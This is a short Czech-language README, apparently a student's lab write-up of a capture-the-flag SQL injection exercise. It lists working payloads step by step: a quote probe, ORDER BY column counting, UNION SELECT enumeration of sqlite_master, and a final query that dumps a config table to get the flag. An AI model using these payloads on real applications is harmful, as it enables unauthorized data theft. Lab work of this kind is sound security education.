# PVA-ukol
PVA - prace s GitHubem
Report: Penetrační test SQL Injection
**1. Průzkum**
Ověřil jsem zranitelnost vyhledávacího pole vložením znaku `'`. 
Výsledek: Server vrátil chybu: `SQL Chyba: unrecognized token: "'"`.
Tato chyba potvrzuje, že aplikace je zranitelná vůči SQL Injection.
**2. Zjištění struktury**
Pomocí příkazu `' ORDER BY X--` jsem zjistil, že dotaz vrací 2 sloupce.
(Příkaz `' ORDER BY 3--` vyhodil chybu "should be between 1 and 2").

Následně jsem vylistoval strukturu databáze příkazem:
`' UNION SELECT 1, sql FROM sqlite_master WHERE type='table'--`
Zjistil jsem existenci tabulky config se sloupci key a value.

 **3. Exfiltrace dat**
K získání vlajky jsem použil finální payload:
`' UNION SELECT key, value FROM config--`

Získaná vlajka: `FLAG{s3cur3_sql_1nj3cti0n_v1ctory}`
